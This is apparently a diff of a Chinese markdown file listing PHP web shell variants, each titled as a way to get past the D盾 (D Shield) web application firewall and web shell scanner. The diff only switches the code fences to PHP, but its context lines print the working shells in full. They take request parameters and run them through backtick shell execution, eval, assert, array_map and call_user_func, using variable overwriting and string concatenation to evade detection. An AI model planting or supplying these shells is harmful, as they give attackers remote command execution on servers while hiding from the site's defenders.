@@ -10,7 +10,7 @@
 
 ## **0x01 extract 变量覆盖过D盾**
 
-```text
+```php
 <?php  $a=1;$b=$_POST;extract($b);print_r(`$a`)?>
 ```
 
@@ -18,7 +18,7 @@
 
 ## **0x02 parse\_str 变量覆盖过D盾**
 
-```text
+```php
 <?php  $a=1;$b="a=".$_GET['a'];parse_str($b);print_r(`$a`)?>
 ```
 
@@ -26,7 +26,7 @@
 
 ## **0x03 \_\_destruct 析构函数过D盾**
 
-```text
+```php
 <?php 
 
 class User
@@ -47,7 +47,7 @@ $user->name = ''.$_POST['name'];
 
 ## **0x04 null 拼接过D盾**
 
-```text
+```php
 <?php
 
 $name = $_GET['name'];
@@ -63,7 +63,7 @@ eval($name1.$name2.$name);
 
 ## **0x05 '' 拼接过D盾**
 
-```text
+```php
 <?php
 
 $name = $_GET['name'];
@@ -79,7 +79,7 @@ eval($name1.$name2.$name);
 
 ## **0x06 '' null 拼接过D盾**
 
-```text
+```php
 <?php
 $a = $_GET['a'];
 $c = null;
@@ -92,7 +92,7 @@ eval(''.$c.$a);
 
 ## **0x07 array\_map函数过D盾**
 
-```text
+```php
 <?php
 function user()
 {
@@ -109,7 +109,7 @@ array_map($a123,$a123 = $x123 );
 
 ## **0x08 call\_user\_func\_array函数过D盾**
 
-```text
+```php
 <?php
 
 function a(){
@@ -125,7 +125,7 @@ call_user_func_array($a,$a=$aa);
 
 ## **0x09 call\_user\_func函数过D盾**
 
-```text
+```php
 <?php
 function a(){
      return 'assert';
